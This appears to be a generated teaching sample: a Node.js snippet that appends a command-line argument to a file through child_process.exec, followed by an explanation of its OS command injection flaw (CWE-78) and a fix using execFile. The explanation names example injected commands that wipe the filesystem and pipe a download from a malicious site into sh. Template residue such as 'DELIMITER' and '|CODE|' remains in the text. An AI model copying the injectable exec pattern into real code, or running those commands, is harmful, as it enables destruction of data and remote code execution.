const userInput = process.argv[2];
const exec = require('child_process').exec;
exec(`echo ${userInput} >> moments.txt`, (err, stdout, stderr) => {
    if (err) {
        console.error(err);
        return;
    }
    console.log('User moment submitted successfully!');
});

/*"""DELIMITER
```
|CODE|```

Explanation of Vulnerability:
The code snippet above is vulnerable to OS Command Injection (CWE-78) due to the direct concatenation of user input (`userInput`) into the `exec` function call without proper validation or sanitization. This vulnerability enables attackers to execute arbitrary commands on the underlying operating system.

How It Could Be Exploited:
An attacker could craft the `userInput` value to include OS commands like `rm -rf /` to delete critical files on the system or `curl malicious-site.com | sh` to download and execute malicious scripts. Since the input is directly passed to the operating system, any valid OS command could be injected and executed.

How to Fix the Vulnerability:
To fix this vulnerability, input validation and sanitization should be implemented to prevent user input from containing special characters that are used in OS commands. One approach is to use whitelisting validation to only allow specific characters or patterns in the input. Additionally, using parameterized commands with libraries like `child_process.execFile` can help prevent command injection by avoiding shell interpretation of user input.